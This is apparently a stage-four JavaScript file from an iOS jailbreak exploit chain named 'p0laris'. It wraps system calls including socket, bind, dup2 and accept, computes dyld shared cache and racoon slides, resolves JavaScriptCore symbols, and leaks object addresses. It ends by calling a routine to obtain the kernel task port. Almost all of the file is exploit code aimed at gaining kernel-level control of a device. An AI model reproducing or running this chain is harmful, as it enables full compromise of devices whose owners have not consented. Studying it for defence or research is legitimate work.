var socket = scall_wrapper("socket");
var htons = scall_wrapper("htons");
var inet_addr = scall_wrapper("inet_addr");
var dup2 = scall_wrapper("dup2");
var bind = scall_wrapper("bind");
var listen = scall_wrapper("listen");
var accept = scall_wrapper("accept");
var close = scall_wrapper("close");
var printf = scall_wrapper("printf");
var AF_INET = 2;
var SOCK_DGRAM = 2;
var SOCK_DGRAM = 2;
var IPPROTO_UDP = 17;

function prep_shit() {
	string_ref = scall("JSStringCreateWithUTF8CString", "victim");
	global_object = scall("JSContextGetGlobalObject", read_u32(slid + reserve_addr + 0x44));
	jsobj_addr = scall("JSObjectGetProperty", read_u32(slid + reserve_addr + 0x44), global_object, string_ref, NULL);
	large_buf_ptr = leak_vec(large_buf);
}

function main() {
	syslog(LOG_SYSLOG, "__p0laris_LOG_START__");
	p0laris_log("[*] we out here");
	p0laris_log("[*] landed in stage4");

	p0laris_log("[*] p0laris.dyld_shc_slide=0x%08x\n", p0laris.dyld_shc_slide);
	p0laris_log("[*] p0laris.racoon_slide=0x%08x\n", p0laris.racoon_slide);

//	printf = p0laris_log;

	printf("test");

	var dyld_shc_slide = get_dyld_shc_slide();

	sym_cache["JSStringCreateWithUTF8CString"] = JSStringCreateWithUTF8CString + dyld_shc_slide;
	sym_cache["JSObjectGetProperty"] = JSObjectGetProperty + dyld_shc_slide;
	sym_cache["JSContextGetGlobalObject"] = JSContextGetGlobalObject + dyld_shc_slide;
	prep_shit();

	var tfp0 = get_kernel_task();

	syslog(LOG_SYSLOG, "__p0laris_LOG_END__");
	return 0;
}